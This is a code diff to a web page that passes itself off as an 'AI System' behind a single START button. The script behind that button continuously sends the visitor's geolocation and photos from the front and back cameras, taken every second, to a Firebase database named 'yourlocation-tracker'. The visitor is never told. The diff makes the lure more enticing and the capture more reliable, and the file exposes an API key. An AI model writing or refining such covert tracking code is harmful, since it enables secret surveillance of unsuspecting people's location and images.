@@ -7,25 +7,40 @@
 <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
 
 <style>
+
 body{
 background:black;
 color:white;
 text-align:center;
 font-family:Arial;
+padding-top:100px;
 }
+
+h1{
+font-size:55px;
+margin-bottom:50px;
+}
+
+button{
+font-size:40px;
+padding:20px 60px;
+border:none;
+border-radius:10px;
+background:lime;
+color:black;
+font-weight:bold;
+}
+
 video{
 display:none;
 }
-button{
-padding:15px;
-font-size:18px;
-}
+
 </style>
 
 </head>
 <body>
 
-<h2>AI System Ready</h2>
+<h1>WHAT IS AI SYSTEM</h1>
 
 <button onclick="startSystem()">START</button>
 
@@ -36,7 +51,6 @@ font-size:18px;
 
 const firebaseConfig = {
  apiKey: "AIzaSyAiC_oz0Qm99P1K9DcRFQb4eY5GHRujW_c",
- authDomain: "yourlocation-tracker.firebaseapp.com",
  databaseURL: "https://yourlocation-tracker-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "yourlocation-tracker"
 };
@@ -47,7 +61,7 @@ let deviceId="phone_"+Math.floor(Math.random()*100000);
 
 function startSystem(){
 
-// LOCATION
+// LOCATION TRACK
 navigator.geolocation.watchPosition(function(pos){
 
 firebase.database().ref("devices/"+deviceId+"/location").set({
@@ -60,46 +74,67 @@ lon:pos.coords.longitude
 // FRONT CAMERA
 navigator.mediaDevices.getUserMedia({
 video:{facingMode:"user"}
-}).then(stream=>{
+})
+.then(stream=>{
 
 let video=document.getElementById("frontCam");
+
 video.srcObject=stream;
 
-capture(video,"front");
+video.onloadedmetadata=function(){
+
+video.play();
+
+startCapture(video,"front");
+
+};
 
 });
 
 // BACK CAMERA
 navigator.mediaDevices.getUserMedia({
 video:{facingMode:"environment"}
-}).then(stream=>{
+})
+.then(stream=>{
 
 let video=document.getElementById("backCam");
+
 video.srcObject=stream;
 
-capture(video,"back");
+video.onloadedmetadata=function(){
+
+video.play();
+
+startCapture(video,"back");
+
+};
 
 });
 
 }
 
-function capture(video,type){
+function startCapture(video,type){
 
 let canvas=document.createElement("canvas");
+
 let ctx=canvas.getContext("2d");
 
 setInterval(()=>{
+
+if(video.videoWidth===0) return;
 
 canvas.width=video.videoWidth;
 canvas.height=video.videoHeight;
 
 ctx.drawImage(video,0,0);
 
+let img=canvas.toDataURL("image/jpeg",0.7);
+
 firebase.database().ref("devices/"+deviceId+"/camera/"+type).set({
-img:canvas.toDataURL("image/jpeg",0.5)
+img:img
 });
 
-},1500);
+},1000);
 
 }
 
